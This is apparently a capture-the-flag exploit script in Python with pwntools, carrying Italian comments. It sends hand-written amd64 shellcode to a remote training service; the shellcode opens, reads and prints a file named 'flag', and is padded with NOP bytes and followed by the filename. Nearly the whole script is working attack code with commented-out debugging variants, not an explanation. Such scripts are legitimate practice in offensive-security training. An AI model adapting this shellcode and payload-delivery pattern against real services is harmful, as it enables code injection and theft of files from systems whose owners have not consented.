#! /usr/bin/python3
import sys
import pwn
import time
#pwn.context.log_level='DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh= ssh("username","ip")
# r= ssh.process("./multistage")                    multistage name of the process

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./onlyreadwrite")
#pwn.gdb.attach(r, '''
#b * 0x0040154d
#c
#''' )

shellcode1= '''
mov rbx,rax
mov rax,0x2
mov rsi,0x0
add rbx,0x64
mov rdi,rbx
mov rdx,0
syscall
mov rdi,rax
mov rax,0x0
mov rdx,0x70
mov rsi,rbx
syscall
mov rax,0x1
mov rdi,0x1
mov rsi,rbx
mov rdx,0x30
syscall
'''
pwn.context.arch="amd64"
print(len(pwn.asm(shellcode1)))
filename=b'flag\x00'

#input("waiting")
#print(len(pwn.asm(shellcode1)))
#print(pwn.asm(shellcode1))
#print(20+len(pwn.asm(shellcode2)))

r = pwn.remote("bin.training.offdef.it",2006)
#r.interactive()
length=len(pwn.asm(shellcode1))
r.send(pwn.asm(shellcode1)+b'\x90'*(100-length)+filename)
#r.send(pwn.asm(shellcode2)+b'')
#r.recv()
#r.send()
#r.send(len(fragment1)*b'\x90'+pwn.asm(shellcode2)+payload)
r.interactive()

#sys.stdout.buffer.write(pwn.asm(shellcode1)+(20-len(pwn.asm(shellcode1)))*b'\x41'+payload+pwn.asm(shellcode2))
#input("wait")
#sys.stdout.buffer.write(payload+pwn.asm(shellcode2))
